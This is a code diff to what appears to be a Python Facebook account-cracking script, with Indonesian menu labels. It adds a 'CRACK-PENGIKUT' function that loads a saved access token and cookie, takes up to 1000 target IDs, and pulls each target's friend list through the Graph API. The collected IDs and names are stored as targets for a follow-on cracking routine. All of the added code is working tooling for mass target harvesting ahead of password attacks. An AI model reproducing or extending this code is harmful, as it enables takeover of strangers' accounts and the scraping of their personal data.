@@ -270,7 +270,7 @@ def menu():
 	        dump(idt,"",{"cookie":cok},token)
 	        atur_id()
 	if CYXIEON_GANTENG in ['02','2']:
-	        dump_massal()
+	        dump_asep()
 	elif CYXIEON_GANTENG in ['03','3']:
 	        hasil_cp()
 	elif CYXIEON_GANTENG in ['04','4']:
@@ -335,6 +335,60 @@ def dump_massal():
 	    exit()
 	except (KeyError,IOError):
 		exit()
+#-------------------[ CRACK-PENGIKUT ]----------------#
+def dump_asep():
+    try:
+        token = open(".token.txt", "r").read()
+        cok = open(".cok.txt", "r").read()
+    except IOError:
+        exit()
+    try:
+        kumpulkan = int(input(f">> {H}Mau Berapa Id?{N} : "))
+    except ValueError:
+        exit()
+    if kumpulkan < 1 or kumpulkan > 1000:
+        exit()
+    ses = requests.Session()
+    bilangan = 0
+    for KOTG49H in range(kumpulkan):
+        bilangan += 1
+        Masukan = input(f">> {H}Masukkan Id Yang Ke {N}" + str(bilangan) + f" : ")
+        uid.append(Masukan)
+    for user in uid:
+        try:
+            head = {
+                "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"
+            }
+            if len(id) == 0:
+                params = {"access_token": token, "fields": "friends"}
+            else:
+                params = {"access_token": token, "fields": "friends"}
+            url = requests.get(
+                "https://graph.facebook.com/{}".format(user),
+                params=params,
+                headers=head,
+                cookies={"cookies": cok},
+            ).json()
+            for xr in url["friends"]["data"]:
+                try:
+                    woy = xr["id"] + "|" + xr["name"]
+                    if woy in id:
+                        pass
+                    else:
+                        id.append(woy)
+                except:
+                    continue
+        except (KeyError, IOError):
+            pass
+        except requests.exceptions.ConnectionError:
+            exit()
+    try:
+        print(" : " + str(len(id)))
+        setting()
+    except requests.exceptions.ConnectionError:
+        exit()
+    except (KeyError, IOError):
+        exit()
 #----------[ CRACK-PUBLIK  ]----------#            
 def dump(idt,fields,cookie,token):
 	try:
